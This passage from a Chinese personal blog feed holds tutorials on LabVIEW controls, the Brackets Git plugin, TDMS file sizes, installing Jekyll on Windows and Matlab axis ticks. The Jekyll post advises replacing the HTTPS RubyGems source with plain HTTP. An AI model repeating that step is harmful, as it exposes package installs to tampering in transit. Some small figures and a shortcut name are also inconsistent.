<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>上面提到的<strong>引用</strong>也是非常常用的一个功能，它相当于C/C++中的<strong>指针</strong>，通过它可以获取控件的识别标识、修改控件属性等。最重要的一点：当我们把控件A的引用作为函数参数传递至某个函数后，被调函数对该引用的操作直接作用在控件A上，而不再需要回调参数或全局变量的参与，这是非常重要和实用的功能。</p>
<h3 id="标签-amp-标题"><a href="#标签-amp-标题" class="headerlink" title="标签&amp;标题"></a>标签&amp;标题</h3><p>在前面板中，每个控件都有对应的<strong>标签</strong>和<strong>标题</strong>，两者是有区别的。默认显示的是标签，而且标签和标题的默认值是一样的。在程序框图中，只能显示控件的标签，无法显示其标题。Ctrl+H打开控件的说明信息，其显示的既有标题信息，又有标签信息。通常，标签名称较短，用于程序框图使用；标题可以稍长些，在前面板显示标题可以详细描述控件功能，同时放在帮助信息中方便用户查询。</p>
<p><img src="/assets/labview/keyWords/tag&amp;title.png" alt="Labview tag&amp;title"></p>
<p>不同控件的标签和标题都可以相同，但不建议这样做，标签通常是唯一的，唯一指定某一个控件，类似于人的学号。对标题的要求则宽松些，可同可不同。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里讲述了LabVIEW常用的一些基本概念，其它未提及的常用概念较为简单，或是仅对某些特定控件有意义，这就不多说了。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Brackets - Git插件的使用方法]]></title>
      <url>https://www.litreily.top/2016/05/15/brackets-git/</url>
      <content type="html"><![CDATA[<p>Brackets，一款专职做网页设计的开发工具，其插件也是极为丰富，Git自然是少不了的，那么如何安装和使用它呢，我以Windows 10环境为例进行说明。</p>
<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="打开插件管理器"><a href="#打开插件管理器" class="headerlink" title="打开插件管理器"></a>打开插件管理器</h3><p>在Brackets中，基本上所有的插件都可以从插件管理器(Extension Manager)中安装，该管理器可以从Brackets软件菜单栏File中找到。</p>
<p><img src="/assets/brackets/git/extension manager.png" alt="Extension Manager"></p>
<h3 id="搜素并安装git插件"><a href="#搜素并安装git插件" class="headerlink" title="搜素并安装git插件"></a>搜素并安装git插件</h3><ul>
<li>打开插件管理器后，选择“Available”选项卡，在搜索框中输入“git”。</li>
</ul>
<p><img src="/assets/brackets/git/input git.png" alt="input git"></p>
<ul>
<li>在弹出的列表中找到“Brackets Git”，点击“install”开始安装。</li>
</ul>
<p><img src="/assets/brackets/git/install git.png" alt="install git"></p>
<ul>
<li>安装完成后，将提示“Installation successful!”。</li>
</ul>
<p><img src="/assets/brackets/git/install success.png" alt="install success"></p>
<h3 id="查看Git插件"><a href="#查看Git插件" class="headerlink" title="查看Git插件"></a>查看Git插件</h3><p>安装完成后，可以在插件管理器的“Installed”选项卡中查看已安装的插件。</p>
<p><img src="/assets/brackets/git/installed extensions.png" alt="installed extensions"></p>
<p>此外，如果我们想知道它保存在哪个地方，可以打开文件资源管理器,在路径：</p>
<pre><code class="cmd">C:\\Users\USER_NAME\AppData\Roaming\Brackets\extensions\user
</code></pre>
<p>下进行查看。这里保存了用户安装的所有插件。</p>
<p><img src="/assets/brackets/git/extensions.png" alt="extensions"></p>
<h2 id="界面布局"><a href="#界面布局" class="headerlink" title="界面布局"></a>界面布局</h2><h3 id="整体布局"><a href="#整体布局" class="headerlink" title="整体布局"></a>整体布局</h3><p>在Brackets右侧插件栏中可以找到git图标，点击该图标或使用快捷键<code>Ctrl+ALG+G</code>可以打开或关闭界面下方的git工具。在界面左侧，当有文件被修改并且尚未<code>commit</code>时，文件名前面会出现红色竖杠标记，文件中被修改的地方也会出现相应的标记。此外，在界面左侧，项目文件夹下方有一个下拉选项，显示当前所在的git分支。</p>
<p><img src="/assets/brackets/git/git layout.png" alt="git layout"></p>
<h3 id="工具面板"><a href="#工具面板" class="headerlink" title="工具面板"></a>工具面板</h3><p>git工具面板按区域可分为两大块，上面是控件栏，下面是内容指示。</p>
<p><img src="/assets/brackets/git/git tools.png" alt="git tools"></p>
<p>下面是对各个控件的简要说明：</p>
<ul>
<li><img src="/assets/brackets/git/git%20clone.png" class="inline-img">:  初始化/克隆项目</li>
<li><img src="/assets/brackets/git/git%20commit.png" class="inline-img">： 提交当前更改内容</li>
<li><img src="/assets/brackets/git/git%20updown.png" class="inline-img">： 跳至上一个/下一个文件修改位置</li>
<li><img src="/assets/brackets/git/git%20history.png" class="inline-img">： 显示仓库历史提交记录/当前文件历史修改记录</li>
<li><img src="/assets/brackets/git/git%20refresh.png" class="inline-img">： 刷新仓库内容/更多指令选项</li>
<li><img src="/assets/brackets/git/git%20tag.png" class="inline-img">： 添加标签</li>
<li><img src="/assets/brackets/git/git%20push.png" class="inline-img">： 切换远程仓库源/fetch/pull/push</li>
<li><img src="/assets/brackets/git/git%20settings.png" class="inline-img">： 打开指令窗口/Git Settings界面</li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="关联Git-GUI"><a href="#关联Git-GUI" class="headerlink" title="关联Git GUI"></a>关联Git GUI</h3><p>Brackets的git插件仅仅是个插件，要使用git进行代码管理，前提是电脑已装有git软件，如Windows的git for Windows，安装方法这里不多说。当我们安装好git软件并配置好环境变量后，默认情况下，Brackets能够自动识别git的安装路径；如果没有识别，可以手动设置，打开Git Settings界面，选择Git configuration选项卡，在“Path to Git executable”输入git的安装路径。</p>
<p><img src="/assets/brackets/git/git setPath.png" alt="git settings"></p>
<h3 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h3><p>当我们新建一个仓库，需要使用git进行管理时，首先应该在工程目录下执行<code>git init</code>指令，如果使用git插件，则只需在git工具面板中点击“Init”按钮即可。</p>
<p><img src="/assets/brackets/git/git init.png" alt="git init"></p>
<h3 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h3><p>为了推送代码至远程仓库，可以选择Github、Coding等带有Git管理器的网站，新建项目并复制仓库网址。为了实现:</p>
<pre><code class="bash">git remote add origin https://git.coding.net/litreily/svg-social.git
</code></pre>
<p>可以在Brackets中打开git工具，点击右侧第一个按钮，选择“Create new remote...”，然后依次输入仓库名称以及网址，确认即可。</p>
<p><img src="/assets/brackets/git/git remote.png" alt="git remote"></p>
<p><img src="/assets/brackets/git/git remote add.png" alt="git remote"></p>
<h3 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h3><p>当我们需要提交已修改文件时，可以执行<code>git add File_name</code>/<code>git add .</code>以及<code>git commit</code>。如果使用git插件，可以在git工具中勾选需要提交的文件，然后点击提交按钮，在弹出的界面中输入提交信息，点击确认即可。</p>
<p><img src="/assets/brackets/git/git commit files.png" alt="git commit"></p>
<h3 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h3><p>在联网情况下，如果需要将代码推送至远程仓库，需要使用指令<code>git push</code>,如：</p>
<pre><code class="bash">git push origin master
</code></pre>
<p>如果使用git插件，可以点击推送按钮，首次推送需要填写用户名和密码，即远程仓库对应的用户名和密码。</p>
<p><img src="/assets/brackets/git/git push files.png" alt="git push"></p>
<p><img src="/assets/brackets/git/git push success.png" alt="git push"></p>
<h3 id="git-pull-git-fetch"><a href="#git-pull-git-fetch" class="headerlink" title="git pull / git fetch"></a>git pull / git fetch</h3><p>如果用户在远程仓库修改了代码或添加了新的文件，此时可以在本地使用指令<code>git pull</code>获取更新文件，如：</p>
<pre><code class="bash">git pull origin master
</code></pre>
<p>如果使用git插件，可以点击拉取按钮。</p>
<p><img src="/assets/brackets/git/git pull.png" alt="git pull"></p>
<p><img src="/assets/brackets/git/git pull success.png" alt="git pull"></p>
<p>指令<code>git fetch</code>的操作方法类似，辞不赘述。</p>
<h3 id="git-branch-git-checkout-git-merge"><a href="#git-branch-git-checkout-git-merge" class="headerlink" title="git branch / git checkout / git merge"></a>git branch / git checkout / git merge</h3><p>如果需要创建新的分支、切换分支或是合并分支，我们通常需要使用指令<code>git branch</code>/<code>git checkout</code>/<code>git merge</code>,在Brackets中，可以通过界面右侧的分支选项完成这些操作。</p>
<p><img src="/assets/brackets/git/git checkout.png" alt="git checkout"></p>
<p><img src="/assets/brackets/git/git branch.png" alt="git branch"></p>
<h3 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h3><p>如果需要给当前版本添加标签，可以点击标签按钮，输入标签名，点击确定即可，下次推送的时候记得在推送窗口勾选“Send tags”。</p>
<p><img src="/assets/brackets/git/git new tag.png" alt="git new tag"></p>
<h3 id="打开指令窗口"><a href="#打开指令窗口" class="headerlink" title="打开指令窗口"></a>打开指令窗口</h3><p>如果习惯使用敲指令，或是有些指令不得不通过指令窗口才能实现，可以通过git插件打开git bash。</p>
<p><img src="/assets/brackets/git/git bash.png" alt="git bash"></p>
<h3 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h3><p>查看推送记录：</p>
<p><img src="/assets/brackets/git/git history push.png" alt="git push history"></p>
<p>查看某文件的提交记录：</p>
<p><img src="/assets/brackets/git/git history file.png" alt="git file history"></p>
<h3 id="放弃更改"><a href="#放弃更改" class="headerlink" title="放弃更改"></a>放弃更改</h3><p>如果我们需要放弃某些文件的修改时，可以在git工具的内容显示区域找到该文件，点击“discard changes”。如果想要删除某些刚刚添加但还未提交的文件，同样可以在该区域找到文件，通过点击“Delete file”删除文件。</p>
<p><img src="/assets/brackets/git/git discard.png" alt="git discard"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>git指令丰富，上述并非全部，但是尚且够用，往后更新同步。</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> brackets </tag>
            
            <tag> git </tag>
            
            <tag> tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - 手自动存储TDMS文件的区别]]></title>
      <url>https://www.litreily.top/2016/05/11/DAQ-TDMS/</url>
      <content type="html"><![CDATA[<p>在Labview的软件开发过程中，少不了使用DAQ（Data Acquisition）助手，在使用DAQ助手采集数据时，通常需要存储数据，此时我们可以使用DAQ助手的配置界面设置TDMS（Technical Data Management Streaming）文件路径。而TDMS文件是NI主推的一种二进制记录文件，可以大大减小数据的存储容量。</p>
<p>为了研究使用DAQ助手自动存储TDMS文件产生的数据大小，我专程写了个测试程序，使用NI MAX创建的模拟采集卡生成模拟正弦波信号，通过测试程序进行采集和存储。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>程序名称：仿DAQ设计.vi</p>
<ul>
<li>前面板</li>
</ul>
<p><img src="/assets/labview/saveTdms/panel.png" alt="前面板"></p>
<ul>
<li>程序框图</li>
</ul>
<p><img src="/assets/labview/saveTdms/codeBlock.png" alt="程序框图"></p>
<h2 id="程序测试"><a href="#程序测试" class="headerlink" title="程序测试"></a>程序测试</h2><h3 id="采样信息"><a href="#采样信息" class="headerlink" title="采样信息"></a>采样信息</h3><ul>
<li>模拟采集卡：NI USB-6341</li>
<li>采样频率：100Hz；</li>
<li>采样点数：100；</li>
<li>采样时间：5分钟；</li>
<li>物理通道：ai0,ai1,ai2;</li>
</ul>
<h3 id="采样过程"><a href="#采样过程" class="headerlink" title="采样过程"></a>采样过程</h3><ul>
<li>程序运行中</li>
</ul>
<p><img src="/assets/labview/saveTdms/saveTdms.png" alt="saveTdms"></p>
<ul>
<li>程序运行结束</li>
</ul>
<p><img src="/assets/labview/saveTdms/saveTdmsEnd.png" alt="saveTdmsEnd"></p>
<h3 id="采样结果"><a href="#采样结果" class="headerlink" title="采样结果"></a>采样结果</h3><pre><code class="txt">总采样点数：30000*3 = 90000
.tdms文件大小：180kB(185,132Bytes)
185216(Bytes)/90000 ≈ 2.057956Bytes ≈ 2Bytes
.tdms_index文件大小：5.01kB(5132Bytes)
</code></pre>
<p>说明每个采样点对应的存储大小为2Bytes左右。如果使用普通文件（如：.txt/.dat等）存储，一个双精度型数据需要占用8Bytes的空间，对应其文件大小将是tdms文件的4倍左右。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol>
<li><p>如果使用DAQ助手自动存储TDMS文件，它将存储已创建的所有虚拟通道的数据，无法单独存储某一通道的数据。</p>
</li>
<li><p>对于同一个采集卡设备，当用户需要连续采集多路通道的电压/电流信号时，因为采集卡的多路通道使用相同的参考时钟源和多路复用器，所以只能使用一个DAQ助手。此外，该设备的所有通道对应的采样频率也必须一致。但如果用户的多路通道不是同一类型，例如：电压和计数值，像这种情况，用户能且只能使用多个DAQ助手。</p>
</li>
</ol>
<h3 id="手动存储TDMS文件"><a href="#手动存储TDMS文件" class="headerlink" title="手动存储TDMS文件"></a>手动存储TDMS文件</h3><p>为了解决<strong>局限性</strong>提到的第2个问题，我尝试手动添加TDMS存储文件，用以替代DAQ自动存储TDMS方式。为此，我修改了部分程序，在保留DAQ自动存储的同时，在获取数据后再次存储。修改部分如下图所示：</p>
<p><img src="/assets/labview/saveTdms/manualSaveTdms.png" alt="manualSaveTDMS"></p>
<p>再次运行程序，自动存储的tdms文件大小与上述一致，手动存储的tdms文件大小为:</p>
<pre><code class="yml">704kB(720,998Bytes) ≈ 90000 * 8.011089 (Bytes) ≈ 90000 * 8 (Bytes)
</code></pre>
<p>可以看出，在手动存储时，每个数据的数据量为8个字节左右，恰好是双精度数据的大小。所以在一般情况下，我们优先考虑DAQ的自动存储功能，如果为了减少数据量使用手动存储方法，即使减少通道数，也未必能达到效果，除非减少后的通道数小等于总通道数的1/4.</p>
<h3 id="文件属性对比"><a href="#文件属性对比" class="headerlink" title="文件属性对比"></a>文件属性对比</h3><ul>
<li>自动存储文件的属性</li>
</ul>
<p><img src="/assets/labview/saveTdms/autoSaveProperties.png" alt="AutoSaveTdmsProperties"></p>
<ul>
<li>手动存储文件的属性</li>
</ul>
<p><img src="/assets/labview/saveTdms/manualSaveProperties.png" alt="ManualSaveTdmsProperties"></p>
<p>通过属性对比可以看出，自动存储文件比手动存储文件多了一些属性值，包括<strong>换算数量</strong><code>NI_Number_Of_Scales</code>、<strong>换算阶数和配置</strong><code>NI_Scale[n]_config</code>以及<strong>换算的启用状态</strong><code>NI_Scaling_Status</code>。为了验证数据存储文件大小不一致是否与这些多出属性有关，我进行了进一步测试，在手动存储过程中设置了tdms文件属性，使其与自动存储文件的属性一致。</p>
<p><img src="/assets/labview/saveTdms/setTdmsProperties.png" alt="SetTdmsProperties"></p>
<p>但结果依旧令人失望，文件大小并未因此而减小。理论上肯定有方法减小Tdms文件大小，但我现在还不知晓，路漫漫其修远兮，吾将上下而求索。</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在Windows中安装Jekyll]]></title>
      <url>https://www.litreily.top/2016/04/15/install-jekyll/</url>
      <content type="html"><![CDATA[<p>本着无聊爱折腾的精神，又鉴于Windows系统的限制，无奈寻觅网上资料千千万，终寻得一卷 <strong><a href="http://www.madhur.co.in/blog/2011/09/01/runningjekyllwindows.html" target="_blank" rel="noopener">奇书</a></strong>，得偿所愿！</p>
<h2 id="依赖工具"><a href="#依赖工具" class="headerlink" title="依赖工具"></a>依赖工具</h2><ul>
<li><a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">Ruby &amp; Ruby Development Kit</a></li>
<li>Jekyll</li>
<li><a href="http://portablepython.com/wiki/PortablePython2.7.5.1/" target="_blank" rel="noopener">Python</a>(可选)</li>
<li>Pygments(可选)</li>
</ul>
<h2 id="搭建Jekyll环境"><a href="#搭建Jekyll环境" class="headerlink" title="搭建Jekyll环境"></a>搭建Jekyll环境</h2><p>在Windows中下载安装所需的依赖包，并配置好对应的环境变量。</p>
<h3 id="安装Ruby"><a href="#安装Ruby" class="headerlink" title="安装Ruby"></a>安装Ruby</h3><p>由于jekyll采用Ruby开发而得，所以想要使用它就得安装Ruby语言环境。可以从<a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">http://rubyinstaller.org/downloads/</a>下载Ruby安装包，推荐选择<code>Ruby 2.2.4</code>。下载后安装在<code>C:\Ruby</code>，当然，路径不是固定的。</p>
<p><img src="/assets/jekyll/Ruby.png" alt="Ruby"></p>
<h3 id="下载解压Devkit"><a href="#下载解压Devkit" class="headerlink" title="下载解压Devkit"></a>下载解压Devkit</h3><p>下载Ruby的开发工具DevKit，地址与Ruby的<a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">下载地址</a>一致。当然，别忘了根据系统位数选择最新版本的DevKit。至于解压路径，选择<code>C:\devkit</code>即可。</p>
<p><img src="/assets/jekyll/DevKit.png" alt="Development Kit"></p>
<h3 id="初始化Devkit"><a href="#初始化Devkit" class="headerlink" title="初始化Devkit"></a>初始化Devkit</h3><p>使用快捷键<code>Win+R</code>输入<code>cmd</code>打开命令窗口，输入以下指令：</p>
<pre><code class="bash">cd C:\devkit
ruby dk.rb init
</code></pre>
<p><img src="/assets/jekyll/Ruby-init.png" alt="Ruby-init"></p>
<p>运行以上指令后，devkit目录下将会多出一个&quot;config.yml&quot;,其内容为：</p>
<pre><code class="bash"># This configuration file contains the absolute path locations of all
# installed Rubies to be enhanced to work with the DevKit. This config
# file is generated by the &#39;ruby dk.rb init&#39; step and may be modified
# before running the &#39;ruby dk.rb install&#39; step. To include any installed
# Rubies that were not automagically discovered, simply add a line below
# the triple hyphens with the absolute path to the Ruby root directory.
#
# Example:
#
# ---
# - C:/ruby19trunk
# - C:/ruby192dev
#
---
- C:/Ruby
</code></pre>
<h3 id="安装Devkit"><a href="#安装Devkit" class="headerlink" title="安装Devkit"></a>安装Devkit</h3><p>确保文件中指示的Ruby与安装好的Ruby路径一致，然后执行以下指令：</p>
<pre><code class="bash">ruby dk.rb install
</code></pre>
<p>至此，ruby开发环境已配置完成，如果中途出现错误，多半是路径问题或环境变量问题，为以防万一，可以在Windows系统属性中的环境变量中添加ruby路径。</p>
<p><img src="/assets/jekyll/Ruby-envir.png" alt="Ruby-environment"></p>
<h3 id="安装Jekyll"><a href="#安装Jekyll" class="headerlink" title="安装Jekyll"></a>安装Jekyll</h3><p>执行以下指令安装jekyll：</p>
<pre><code class="bash">gem install jekyll
</code></pre>
<p>这一步很有可能会报错，而报错原因基本上出于gem源地址，gem默认源地址为<a href="https://rubygems.org/" target="_blank" rel="noopener">https://rubygems.org/</a>，需要修改为<a href="http://rubygems.org/" target="_blank" rel="noopener">http://rubygems.org/</a>. 修改指令如下：</p>
<pre><code class="bash">gem sources -r https://rubygems.org
gem sources -a http://rubygems.org
</code></pre>
<p>修改后即可正常完成jekyll的下载安装了。安装完成后，便可使用jekyll了。</p>
<h3 id="可选操作"><a href="#可选操作" class="headerlink" title="可选操作"></a>可选操作</h3><p>如果需要使用Pygments提供的代码高亮功能，可以安装<a href="http://portablepython.com/wiki/PortablePython2.7.5.1/" target="_blank" rel="noopener">Python</a>，配置环境变量。再到<a href="https://pypi.python.org/pypi/setuptools#windows" target="_blank" rel="noopener">https://pypi.python.org/</a>下载<code>distribute_setup.py</code>。最后通过执行以下指令进行安装：</p>
<pre><code class="bash">python distribute_setup.py
easy_install Pygments
</code></pre>
<p>更加详细的Pygments说明可以参考<a href="http://havee.me/internet/2013-08/support-pygments-in-jekyll.html" target="_blank" rel="noopener">这里</a>。好了，一切准备就绪。 Enjoy Yourself!</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> jekyll </tag>
            
            <tag> ruby </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - 设置坐标尺度]]></title>
      <url>https://www.litreily.top/2016/04/11/matlab-skill/</url>
      <content type="html"><![CDATA[<p>matlab中，在使用plot绘图时会自动生成带有标尺的坐标系，坐标间距会随屏幕大小自动更改。但有时候由于特殊需求需要修改该间距，此时，我们可以通过set函数进行实现。</p>
<p>以 <code>y=sin(2*pi*10*t)</code> 为例，在使用matlab默认生成方式时，其仿真结果如下图所示：</p>
<p><img src="/assets/matlab/setTickBefore.png" alt="setTickBefore"></p>
<p>代码如下：</p>
<pre><code class="matlab">clc
f=10;               % 信号频率
fs=400;             % 采样频率
N=fs*0.5;           % 采样点数
t=(0:N-1)/fs;       % 时间
y=sin(2*pi*f.*t);   % 信号

plot(t,y);grid on;  % 绘图
xlabel(&#39;时间/t&#39;);     % x轴标题
ylabel(&#39;幅值&#39;);       % y轴标题
title(&#39;y=sin(2*pi*10*t)&#39;)   % 标题
set(gca,&#39;xtick&#39;,0:0.025:t(end));    % 设置x轴标尺
set(gca,&#39;ytick&#39;,min(y):0.4:max(y)); % 设置y轴标尺
</code></pre>
<p>修改标尺后得到的波形如下图所示：</p>
<p><img src="/assets/matlab/setTickAfter.png" alt="setTickAfter"></p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
